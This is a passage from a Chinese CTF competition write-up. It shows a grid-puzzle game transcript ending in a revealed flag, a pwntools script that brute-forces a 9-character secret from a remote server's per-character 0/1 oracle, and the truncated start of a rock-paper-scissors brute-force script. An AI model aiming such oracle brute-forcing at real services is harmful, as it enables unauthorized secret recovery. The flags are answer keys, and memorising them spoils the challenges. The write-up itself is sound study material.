class="hljs-number">1</span><br>●●●○○○○○○<br>●○●●○●●○○<br>●○○●○●●●○<br>○●●○●●●○○<br>○●●○○●●○●<br>●●○●○●●○○<br>●○○○●○○●○<br>●●●○○●●●●<br>●○○○●●●○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○○●●●●●●<br>○○●●○●●○○<br>○○○●○●●●○<br>●●●○●●●○○<br>●●●○○●●○●<br>○●○●○●●○○<br>○○○○●○○●○<br>○●●○○●●●●<br>○○○○●●●○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●●○○○○○○<br>●○●●○●●○○<br>●○○●○●●●○<br>○●●○●●●○○<br>○●●○○●●○●<br>●●○●○●●○○<br>●○○○●○○●○<br>●●●○○●●●●<br>●○○○●●●○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○○●●●●●●<br>○○●●○●●○○<br>○○○●○●●●○<br>●●●○●●●○○<br>●●●○○●●○●<br>○●○●○●●○○<br>○○○○●○○●○<br>○●●○○●●●●<br>○○○○●●●○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●●○○○○○○<br>●○●●○●●○○<br>●○○●○●●●○<br>○●●○●●●○○<br>○●●○○●●○●<br>●●○●○●●○○<br>●○○○●○○●○<br>●●●○○●●●●<br>●○○○●●●○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○○●●●●●●<br>○○●●○●●○○<br>○○○●○●●●○<br>●●●○●●●○○<br>●●●○○●●○●<br>○●○●○●●○○<br>○○○○●○○●○<br>○●●○○●●●●<br>○○○○●●●○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●●○○○○○○<br>●○●●○●●○○<br>●○○●○●●●○<br>○●●○●●●○○<br>○●●○○●●○●<br>●●○●○●●○○<br>●○○○●○○●○<br>●●●○○●●●●<br>●○○○●●●○●<br><br>&gt; exit<br>Success ~ <span class="hljs-number">9</span> step(s).<br>&gt; <br>Round <span class="hljs-number">5</span>/<span class="hljs-number">10</span><br>●○○●●○○○●<br>●●●●●●○●●<br>●●●●○●○●○<br>○●●●●○○●●<br>●●●○○○○●○<br>●○○●●●○●●<br>●○○○○○●●●<br>●○●○●○●○○<br>●○●●●●○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○●●○○●●●○<br>○●●●●●○●●<br>○●●●○●○●○<br>●●●●●○○●●<br>○●●○○○○●○<br>○○○●●●○●●<br>○○○○○○●●●<br>○○●○●○●○○<br>○○●●●●○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●○○●●○○○●<br>●●●●●●○●●<br>●●●●○●○●○<br>○●●●●○○●●<br>●●●○○○○●○<br>●○○●●●○●●<br>●○○○○○●●●<br>●○●○●○●○○<br>●○●●●●○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○●●○○●●●○<br>○●●●●●○●●<br>○●●●○●○●○<br>●●●●●○○●●<br>○●●○○○○●○<br>○○○●●●○●●<br>○○○○○○●●●<br>○○●○●○●○○<br>○○●●●●○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●○○●●○○○●<br>●●●●●●○●●<br>●●●●○●○●○<br>○●●●●○○●●<br>●●●○○○○●○<br>●○○●●●○●●<br>●○○○○○●●●<br>●○●○●○●○○<br>●○●●●●○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○●●○○●●●○<br>○●●●●●○●●<br>○●●●○●○●○<br>●●●●●○○●●<br>○●●○○○○●○<br>○○○●●●○●●<br>○○○○○○●●●<br>○○●○●○●○○<br>○○●●●●○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●○○●●○○○●<br>●●●●●●○●●<br>●●●●○●○●○<br>○●●●●○○●●<br>●●●○○○○●○<br>●○○●●●○●●<br>●○○○○○●●●<br>●○●○●○●○○<br>●○●●●●○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○●●○○●●●○<br>○●●●●●○●●<br>○●●●○●○●○<br>●●●●●○○●●<br>○●●○○○○●○<br>○○○●●●○●●<br>○○○○○○●●●<br>○○●○●○●○○<br>○○●●●●○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●○○●●○○○●<br>●●●●●●○●●<br>●●●●○●○●○<br>○●●●●○○●●<br>●●●○○○○●○<br>●○○●●●○●●<br>●○○○○○●●●<br>●○●○●○●○○<br>●○●●●●○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○●●○○●●●○<br>○●●●●●○●●<br>○●●●○●○●○<br>●●●●●○○●●<br>○●●○○○○●○<br>○○○●●●○●●<br>○○○○○○●●●<br>○○●○●○●○○<br>○○●●●●○○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●○○●●○○○●<br>●●●●●●○●●<br>●●●●○●○●○<br>○●●●●○○●●<br>●●●○○○○●○<br>●○○●●●○●●<br>●○○○○○●●●<br>●○●○●○●○○<br>●○●●●●○○●<br><br>&gt; exit<br>Success ~ <span class="hljs-number">10</span> step(s).<br>&gt; <br>Round <span class="hljs-number">6</span>/<span class="hljs-number">10</span><br>●●●●●○●●●<br>●●●●●○●●●<br>○○○●●○●●○<br>●●●○○●○○○<br>●●●●●●○●●<br>○○●●○●○○●<br>○○○○○○○○○<br>○●●○○○○●●<br>○●○●○●●●●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○○○○●○○○<br>○●●●●○●●●<br>●○○●●○●●○<br>○●●○○●○○○<br>○●●●●●○●●<br>●○●●○●○○●<br>●○○○○○○○○<br>●●●○○○○●●<br>●●○●○●●●●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●●●●○●●●<br>●●●●●○●●●<br>○○○●●○●●○<br>●●●○○●○○○<br>●●●●●●○●●<br>○○●●○●○○●<br>○○○○○○○○○<br>○●●○○○○●●<br>○●○●○●●●●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○○○○●○○○<br>○●●●●○●●●<br>●○○●●○●●○<br>○●●○○●○○○<br>○●●●●●○●●<br>●○●●○●○○●<br>●○○○○○○○○<br>●●●○○○○●●<br>●●○●○●●●●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●●●●○●●●<br>●●●●●○●●●<br>○○○●●○●●○<br>●●●○○●○○○<br>●●●●●●○●●<br>○○●●○●○○●<br>○○○○○○○○○<br>○●●○○○○●●<br>○●○●○●●●●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○○○○●○○○<br>○●●●●○●●●<br>●○○●●○●●○<br>○●●○○●○○○<br>○●●●●●○●●<br>●○●●○●○○●<br>●○○○○○○○○<br>●●●○○○○●●<br>●●○●○●●●●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●●●●○●●●<br>●●●●●○●●●<br>○○○●●○●●○<br>●●●○○●○○○<br>●●●●●●○●●<br>○○●●○●○○●<br>○○○○○○○○○<br>○●●○○○○●●<br>○●○●○●●●●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○○○○●○○○<br>○●●●●○●●●<br>●○○●●○●●○<br>○●●○○●○○○<br>○●●●●●○●●<br>●○●●○●○○●<br>●○○○○○○○○<br>●●●○○○○●●<br>●●○●○●●●●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●●●●○●●●<br>●●●●●○●●●<br>○○○●●○●●○<br>●●●○○●○○○<br>●●●●●●○●●<br>○○●●○●○○●<br>○○○○○○○○○<br>○●●○○○○●●<br>○●○●○●●●●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○○○○●○○○<br>○●●●●○●●●<br>●○○●●○●●○<br>○●●○○●○○○<br>○●●●●●○●●<br>●○●●○●○○●<br>●○○○○○○○○<br>●●●○○○○●●<br>●●○●○●●●●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●●●●○●●●<br>●●●●●○●●●<br>○○○●●○●●○<br>●●●○○●○○○<br>●●●●●●○●●<br>○○●●○●○○●<br>○○○○○○○○○<br>○●●○○○○●●<br>○●○●○●●●●<br><br>&gt; exit<br>Success ~ <span class="hljs-number">10</span> step(s).<br>&gt; <br>Round <span class="hljs-number">7</span>/<span class="hljs-number">10</span><br>●○○○●○○●●<br>●○●●○○●●●<br>●●●○●○●○●<br>○○○●●●○○●<br>○●○●●●●○●<br>●○●●●○○○○<br>●○○○●○●●○<br>○●○●○●○○●<br>●●●●○●○●○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○●●●○●●○○<br>○○●●○○●●●<br>○●●○●○●○●<br>●○○●●●○○●<br>●●○●●●●○●<br>○○●●●○○○○<br>○○○○●○●●○<br>●●○●○●○○●<br>○●●●○●○●○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●○○○●○○●●<br>●○●●○○●●●<br>●●●○●○●○●<br>○○○●●●○○●<br>○●○●●●●○●<br>●○●●●○○○○<br>●○○○●○●●○<br>○●○●○●○○●<br>●●●●○●○●○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○●●●○●●○○<br>○○●●○○●●●<br>○●●○●○●○●<br>●○○●●●○○●<br>●●○●●●●○●<br>○○●●●○○○○<br>○○○○●○●●○<br>●●○●○●○○●<br>○●●●○●○●○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●○○○●○○●●<br>●○●●○○●●●<br>●●●○●○●○●<br>○○○●●●○○●<br>○●○●●●●○●<br>●○●●●○○○○<br>●○○○●○●●○<br>○●○●○●○○●<br>●●●●○●○●○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○●●●○●●○○<br>○○●●○○●●●<br>○●●○●○●○●<br>●○○●●●○○●<br>●●○●●●●○●<br>○○●●●○○○○<br>○○○○●○●●○<br>●●○●○●○○●<br>○●●●○●○●○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●○○○●○○●●<br>●○●●○○●●●<br>●●●○●○●○●<br>○○○●●●○○●<br>○●○●●●●○●<br>●○●●●○○○○<br>●○○○●○●●○<br>○●○●○●○○●<br>●●●●○●○●○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○●●●○●●○○<br>○○●●○○●●●<br>○●●○●○●○●<br>●○○●●●○○●<br>●●○●●●●○●<br>○○●●●○○○○<br>○○○○●○●●○<br>●●○●○●○○●<br>○●●●○●○●○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●○○○●○○●●<br>●○●●○○●●●<br>●●●○●○●○●<br>○○○●●●○○●<br>○●○●●●●○●<br>●○●●●○○○○<br>●○○○●○●●○<br>○●○●○●○○●<br>●●●●○●○●○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○●●●○●●○○<br>○○●●○○●●●<br>○●●○●○●○●<br>●○○●●●○○●<br>●●○●●●●○●<br>○○●●●○○○○<br>○○○○●○●●○<br>●●○●○●○○●<br>○●●●○●○●○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●○○○●○○●●<br>●○●●○○●●●<br>●●●○●○●○●<br>○○○●●●○○●<br>○●○●●●●○●<br>●○●●●○○○○<br>●○○○●○●●○<br>○●○●○●○○●<br>●●●●○●○●○<br><br>&gt; exit<br>Success ~ <span class="hljs-number">10</span> step(s).<br>&gt; <br>Round <span class="hljs-number">8</span>/<span class="hljs-number">10</span><br>○●○○●●○●○<br>●○○●●○○○●<br>○●●○○●●●●<br>●●●●○●●●●<br>●○○●○●●○○<br>●●○●○○●●●<br>●○●○○○●●○<br>●●●●●●●●○<br>○●○●●●○○○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●○●●○○●○●<br>○○○●●○○○●<br>●●●○○●●●●<br>○●●●○●●●●<br>○○○●○●●○○<br>○●○●○○●●●<br>○○●○○○●●○<br>○●●●●●●●○<br>●●○●●●○○○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○●○○●●○●○<br>●○○●●○○○●<br>○●●○○●●●●<br>●●●●○●●●●<br>●○○●○●●○○<br>●●○●○○●●●<br>●○●○○○●●○<br>●●●●●●●●○<br>○●○●●●○○○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●○●●○○●○●<br>○○○●●○○○●<br>●●●○○●●●●<br>○●●●○●●●●<br>○○○●○●●○○<br>○●○●○○●●●<br>○○●○○○●●○<br>○●●●●●●●○<br>●●○●●●○○○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○●○○●●○●○<br>●○○●●○○○●<br>○●●○○●●●●<br>●●●●○●●●●<br>●○○●○●●○○<br>●●○●○○●●●<br>●○●○○○●●○<br>●●●●●●●●○<br>○●○●●●○○○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●○●●○○●○●<br>○○○●●○○○●<br>●●●○○●●●●<br>○●●●○●●●●<br>○○○●○●●○○<br>○●○●○○●●●<br>○○●○○○●●○<br>○●●●●●●●○<br>●●○●●●○○○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○●○○●●○●○<br>●○○●●○○○●<br>○●●○○●●●●<br>●●●●○●●●●<br>●○○●○●●○○<br>●●○●○○●●●<br>●○●○○○●●○<br>●●●●●●●●○<br>○●○●●●○○○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●○●●○○●○●<br>○○○●●○○○●<br>●●●○○●●●●<br>○●●●○●●●●<br>○○○●○●●○○<br>○●○●○○●●●<br>○○●○○○●●○<br>○●●●●●●●○<br>●●○●●●○○○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○●○○●●○●○<br>●○○●●○○○●<br>○●●○○●●●●<br>●●●●○●●●●<br>●○○●○●●○○<br>●●○●○○●●●<br>●○●○○○●●○<br>●●●●●●●●○<br>○●○●●●○○○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●○●●○○●○●<br>○○○●●○○○●<br>●●●○○●●●●<br>○●●●○●●●●<br>○○○●○●●○○<br>○●○●○○●●●<br>○○●○○○●●○<br>○●●●●●●●○<br>●●○●●●○○○<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○●○○●●○●○<br>●○○●●○○○●<br>○●●○○●●●●<br>●●●●○●●●●<br>●○○●○●●○○<br>●●○●○○●●●<br>●○●○○○●●○<br>●●●●●●●●○<br>○●○●●●○○○<br><br>&gt; exit<br>Success ~ <span class="hljs-number">10</span> step(s).<br>&gt; <br>Round <span class="hljs-number">9</span>/<span class="hljs-number">10</span><br>●○○○○○●○○<br>●○●●●●●●●<br>○●○●●●○○○<br>●●●●○○○○○<br>●○○○●●●●●<br>●●○○●●●●○<br>●●○○○●●○○<br>○●○●●○○○●<br>○●○○●●●●●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○●●●●●○●●<br>○○●●●●●●●<br>●●○●●●○○○<br>○●●●○○○○○<br>○○○○●●●●●<br>○●○○●●●●○<br>○●○○○●●○○<br>●●○●●○○○●<br>●●○○●●●●●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●○○○○○●○○<br>●○●●●●●●●<br>○●○●●●○○○<br>●●●●○○○○○<br>●○○○●●●●●<br>●●○○●●●●○<br>●●○○○●●○○<br>○●○●●○○○●<br>○●○○●●●●●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○●●●●●○●●<br>○○●●●●●●●<br>●●○●●●○○○<br>○●●●○○○○○<br>○○○○●●●●●<br>○●○○●●●●○<br>○●○○○●●○○<br>●●○●●○○○●<br>●●○○●●●●●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●○○○○○●○○<br>●○●●●●●●●<br>○●○●●●○○○<br>●●●●○○○○○<br>●○○○●●●●●<br>●●○○●●●●○<br>●●○○○●●○○<br>○●○●●○○○●<br>○●○○●●●●●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○●●●●●○●●<br>○○●●●●●●●<br>●●○●●●○○○<br>○●●●○○○○○<br>○○○○●●●●●<br>○●○○●●●●○<br>○●○○○●●○○<br>●●○●●○○○●<br>●●○○●●●●●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●○○○○○●○○<br>●○●●●●●●●<br>○●○●●●○○○<br>●●●●○○○○○<br>●○○○●●●●●<br>●●○○●●●●○<br>●●○○○●●○○<br>○●○●●○○○●<br>○●○○●●●●●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○●●●●●○●●<br>○○●●●●●●●<br>●●○●●●○○○<br>○●●●○○○○○<br>○○○○●●●●●<br>○●○○●●●●○<br>○●○○○●●○○<br>●●○●●○○○●<br>●●○○●●●●●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●○○○○○●○○<br>●○●●●●●●●<br>○●○●●●○○○<br>●●●●○○○○○<br>●○○○●●●●●<br>●●○○●●●●○<br>●●○○○●●○○<br>○●○●●○○○●<br>○●○○●●●●●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○●●●●●○●●<br>○○●●●●●●●<br>●●○●●●○○○<br>○●●●○○○○○<br>○○○○●●●●●<br>○●○○●●●●○<br>○●○○○●●○○<br>●●○●●○○○●<br>●●○○●●●●●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●○○○○○●○○<br>●○●●●●●●●<br>○●○●●●○○○<br>●●●●○○○○○<br>●○○○●●●●●<br>●●○○●●●●○<br>●●○○○●●○○<br>○●○●●○○○●<br>○●○○●●●●●<br><br>&gt; exit<br>Success ~ <span class="hljs-number">10</span> step(s).<br>&gt; <br>Round <span class="hljs-number">10</span>/<span class="hljs-number">10</span><br>○○●○○●○○○<br>○○○●●○○○○<br>●○○●●○●○○<br>○○○○●○○●○<br>○●●●●●●○○<br>○○●○●○○○○<br>○●○○○●●○●<br>●●○●●●○●○<br>○●●○○○●○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●○●●○●●●<br>●○○●●○○○○<br>○○○●●○●○○<br>●○○○●○○●○<br>●●●●●●●○○<br>●○●○●○○○○<br>●●○○○●●○●<br>○●○●●●○●○<br>●●●○○○●○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○●○○●○○○<br>○○○●●○○○○<br>●○○●●○●○○<br>○○○○●○○●○<br>○●●●●●●○○<br>○○●○●○○○○<br>○●○○○●●○●<br>●●○●●●○●○<br>○●●○○○●○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●○●●○●●●<br>●○○●●○○○○<br>○○○●●○●○○<br>●○○○●○○●○<br>●●●●●●●○○<br>●○●○●○○○○<br>●●○○○●●○●<br>○●○●●●○●○<br>●●●○○○●○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○●○○●○○○<br>○○○●●○○○○<br>●○○●●○●○○<br>○○○○●○○●○<br>○●●●●●●○○<br>○○●○●○○○○<br>○●○○○●●○●<br>●●○●●●○●○<br>○●●○○○●○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●○●●○●●●<br>●○○●●○○○○<br>○○○●●○●○○<br>●○○○●○○●○<br>●●●●●●●○○<br>●○●○●○○○○<br>●●○○○●●○●<br>○●○●●●○●○<br>●●●○○○●○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○●○○●○○○<br>○○○●●○○○○<br>●○○●●○●○○<br>○○○○●○○●○<br>○●●●●●●○○<br>○○●○●○○○○<br>○●○○○●●○●<br>●●○●●●○●○<br>○●●○○○●○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●○●●○●●●<br>●○○●●○○○○<br>○○○●●○●○○<br>●○○○●○○●○<br>●●●●●●●○○<br>●○●○●○○○○<br>●●○○○●●○●<br>○●○●●●○●○<br>●●●○○○●○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○●○○●○○○<br>○○○●●○○○○<br>●○○●●○●○○<br>○○○○●○○●○<br>○●●●●●●○○<br>○○●○●○○○○<br>○●○○○●●○●<br>●●○●●●○●○<br>○●●○○○●○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>●●○●●○●●●<br>●○○●●○○○○<br>○○○●●○●○○<br>●○○○●○○●○<br>●●●●●●●○○<br>●○●○●○○○○<br>●●○○○●●○●<br>○●○●●●○●○<br>●●●○○○●○●<br><br>&gt; <span class="hljs-number">1</span> <span class="hljs-number">1</span><br>○○●○○●○○○<br>○○○●●○○○○<br>●○○●●○●○○<br>○○○○●○○●○<br>○●●●●●●○○<br>○○●○●○○○○<br>○●○○○●●○●<br>●●○●●●○●○<br>○●●○○○●○●<br><br>&gt; exit<br>Success ~ <span class="hljs-number">10</span> step(s).<br>&gt; <br>Ok, You moved <span class="hljs-number">99</span> steps<br>Congratulations!! Your flag:<br><br>flag&#123;8486843b4825b381848030880236252b&#125;<br><br></code></pre></td></tr></table></figure><h3 id="easyfuzz"><a href="#easyfuzz" class="headerlink" title="easyfuzz"></a>easyfuzz</h3><p>一个个遍历9位字符<br>返回的0代表该位字符不对，1则代表该位字符正确</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> os<br><br>context.log_level = <span class="hljs-string">&#x27;error&#x27;</span><br>a = <span class="hljs-number">9</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_string</span>(<span class="hljs-params">data</span>):<br>    r = remote(<span class="hljs-string">&#x27;101.200.122.251&#x27;</span>, <span class="hljs-number">12199</span>)  <span class="hljs-comment"># 远程服务器的地址和端口号，替换为实际值</span><br>    r.recvuntil(<span class="hljs-string">b&quot;Enter a string (should be less than 10 bytes): &quot;</span>)  <span class="hljs-comment"># 接收并丢弃直到遇到指定字符串的输入</span><br>    r.sendline(data)  <span class="hljs-comment"># 发送数据到服务器</span><br>    result = r.recvline().decode().strip()  <span class="hljs-comment"># 接收服务器回传的数据</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> result:<br>        <span class="hljs-built_in">print</span>(result)<br>        os.system(exit)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Sent:&quot;</span>, data)  <span class="hljs-comment"># 打印发送的数据</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Received:&quot;</span>, result)  <span class="hljs-comment"># 打印接收到的数据</span><br>    r.close()  <span class="hljs-comment"># 关闭与服务器的连接</span><br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_correct_string</span>(<span class="hljs-params">current_string, position</span>):<br>    <span class="hljs-keyword">global</span> flag<br>    <span class="hljs-keyword">global</span> a<br>    charset = string.digits + string.ascii_letters  <span class="hljs-comment"># 可能字符的集合，digits 是数字，ascii_letters 是字母</span><br><br>    <span class="hljs-keyword">if</span> position == <span class="hljs-number">9</span>:  <span class="hljs-comment"># 达到字符串的长度上限</span><br>        result = send_string(current_string)  <span class="hljs-comment"># 发送当前字符串并获取结果</span><br>        <span class="hljs-keyword">if</span> result[-<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;1&#x27;</span>:  <span class="hljs-comment"># 如果结果的最后一个字符是 &#x27;1&#x27;，表示字符串是正确的</span><br>            <span class="hljs-keyword">return</span> current_string<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> charset:  <span class="hljs-comment"># 遍历可能的字符集合</span><br>        test_string = ( flag + c +<span class="hljs-string">&#x27;0&#x27;</span>*(<span class="hljs-number">8</span>-<span class="hljs-built_in">len</span>(flag))).encode()  <span class="hljs-comment"># 组合测试字符串，将未使用的位置填充为 &#x27;0&#x27;</span><br>        result = send_string(test_string)  <span class="hljs-comment"># 发送测试字符串并获取结果</span><br>        <span class="hljs-keyword">if</span> result[-(<span class="hljs-number">9</span>-<span class="hljs-built_in">len</span>(flag))] == <span class="hljs-string">&#x27;1&#x27;</span>: <br>            flag = flag + <span class="hljs-built_in">chr</span>(test_string[-(<span class="hljs-number">9</span>-<span class="hljs-built_in">len</span>(flag))])<br>            <span class="hljs-built_in">print</span>(flag)<br>            recursive_result = find_correct_string(test_string.decode(), position+<span class="hljs-number">1</span>)  <span class="hljs-comment"># 递归调用，继续验证下一个字符位置</span><br>            <span class="hljs-keyword">if</span> recursive_result <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:  <span class="hljs-comment"># 如果递归结果不为空，表示找到了正确的字符串</span><br>                <span class="hljs-keyword">return</span> recursive_result<br>          <br>                <br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>  <span class="hljs-comment"># 如果在所有可能的字符中都未找到正确的字符串，则返回 None</span><br><br>correct_string = find_correct_string(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-number">0</span>)  <span class="hljs-comment"># 从空字符串开始验证</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Correct string:&quot;</span>, correct_string)  <span class="hljs-comment"># 打印正确的字符串</span><br></code></pre></td></tr></table></figure><h2 id="强网先锋"><a href="#强网先锋" class="headerlink" title="强网先锋"></a>强网先锋</h2><h3 id="石头剪刀布"><a href="#石头剪刀布" class="headerlink" title="石头剪刀布"></a>石头剪刀布</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 爆破求解 发现机器出拳在前面出拳顺序相同的情况下始终不变 </span><br><span class="hljs-comment"># 每轮剪刀石头布都尝试一次</span><br><span class="hljs-comment"># 获胜则记录下出拳, 用于下一次的求解</span><br><span class="hljs-comment"># 运行爆破后再手动将输出结果粘贴到success函数</span><br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;critical&#x27;</span><br><br>link = <span class="hljs-string">&#x27;nc 8.147.129.191 42289&#x27;</span>.split(<span class="hljs-string">&#x27; &#x27;</span>)<br>p = remote(link[<span class="hljs-number">1</span>], link[<span class="hljs-number">2</span>])<br><br>winning_strategy = []<br><br><span class="hljs-comment"># while len(winning_strategy) &lt; 100:</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">0</span>:<br>    p = remote(link[<span class="hljs-number">1</span>], link[<span class="hljs-number">2</span>])<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> winning_strategy:<br>        p.sendline(<span class="hljs-built_in">str</span>(i).encode())<br>    p.recv()<br>    <span class="hljs-comment"># out = (p.recv().decode(encoding=&#x27;utf-8&#x27;))[-50:]</span><br>    <span class="hljs-comment"># out = 